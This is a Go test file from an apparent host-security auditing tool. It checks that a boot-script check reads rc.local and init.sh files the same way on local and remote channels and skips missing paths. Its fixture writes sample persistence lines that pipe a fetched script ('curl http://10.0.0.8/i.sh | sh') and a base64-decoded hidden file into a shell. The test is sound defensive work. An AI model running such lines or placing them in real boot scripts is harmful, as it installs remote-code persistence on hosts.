// The boot-script tier (rc.local, init.sh) reads a plain list of files, which is
// also its whole surface: a path dropped from the list stops appearing in the
// report with nothing else changing. One test runs the tier over a fixture on both
// channels, and one pins the catalog's own list.

package linux

import (
	"context"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"karma/internal/model"
	"karma/internal/testkit"
)

// bootScriptFixture is a directory shaped like the boot scripts: two files with a
// line a rule reads and one path that does not exist — a host without that boot
// script is the common case, and it must stay out of the report. The absent path
// leads, so the loop's status is the last existing file's: a literal path that is
// not there leaves the loop's status non-zero, and the walk stays silent about it
// because a failure with no stderr is not a finding (checked live on the test VPS,
// where none of the three boot scripts exists).
func bootScriptFixture(t *testing.T) []string {
	t.Helper()
	dir := t.TempDir()
	rcLocal := filepath.Join(dir, "rc.local")
	initSh := filepath.Join(dir, "init.sh")
	if err := os.WriteFile(rcLocal, []byte("#!/bin/sh\ncurl http://10.0.0.8/i.sh | sh\n"), 0o700); err != nil {
		t.Fatalf("write the fixture: %v", err)
	}
	if err := os.WriteFile(initSh, []byte("#!/bin/sh\nbase64 -d /etc/.x | sh\n"), 0o700); err != nil {
		t.Fatalf("write the fixture: %v", err)
	}
	return []string{filepath.Join(dir, "absent"), rcLocal, initSh}
}

// The tier the boot-script check is built from, run over a fixture: one section
// per path it was given, the same bytes from the in-process branch and from the
// script the remote channels run, and nothing for a path that is not there.
func TestReadFilesTierReadsEveryPathOnBothChannels(t *testing.T) {
	paths := bootScriptFixture(t)
	steps := readFilesCheck(paths...)
	if len(steps) != 1 || len(steps[0]) != 1 {
		t.Fatalf("the read-files tier is one step of one probe: %v", steps)
	}
	dual, ok := steps[0][0].Inv.(model.Dual)
	if !ok {
		t.Fatalf("the tier should be a Dual: %+v", steps[0][0].Inv)
	}
	local, err := dual.Run(context.Background())
	if err != nil {
		t.Fatalf("the in-process branch: %v", err)
	}
	remote := runPipeline(t, dual.Script)
	if local != remote {
		t.Fatalf("the two channels must print the same text:\nlocal  %q\nremote %q", local, remote)
	}
	for _, body := range []string{local, remote} {
		for _, want := range []string{
			"== " + paths[1], "== " + paths[2],
			"curl http://10.0.0.8/i.sh | sh", "base64 -d /etc/.x | sh",
		} {
			if !strings.Contains(body, want) {
				t.Fatalf("%q is missing from the tier's output: %q", want, body)
			}
		}
		if strings.Contains(body, paths[0]) {
			t.Fatalf("a path that does not exist should not appear in the report: %q", body)
		}
	}
}

// The catalog's own list, from the artifact a test can read: the generated script
// names every path (the in-process branch is a closure over the same list), and
// the list is the one this test names, because dropping a boot script from it is
// silent at run time.
func TestBootScriptCheckCoversEveryBootScript(t *testing.T) {
	check := testkit.CheckByID(t, All, "rc-local")
	if len(check.Steps) != 1 || len(check.Steps[0]) != 1 {
		t.Fatalf("the boot-script check is one step of one probe: %v", check.Steps)
	}
	script := check.Steps[0][0].Inv.(model.Dual).Script
	for _, path := range bootScriptPaths {
		if !strings.Contains(script, path) {
			t.Errorf("the boot-script tier should read %s: %q", path, script)
		}
	}
	want := []string{"/etc/rc.local", "/etc/rc.d/rc.local", "/etc/init.sh"}
	if !slices.Equal(bootScriptPaths, want) {
		t.Errorf("boot-script paths = %v, want %v", bootScriptPaths, want)
	}
}
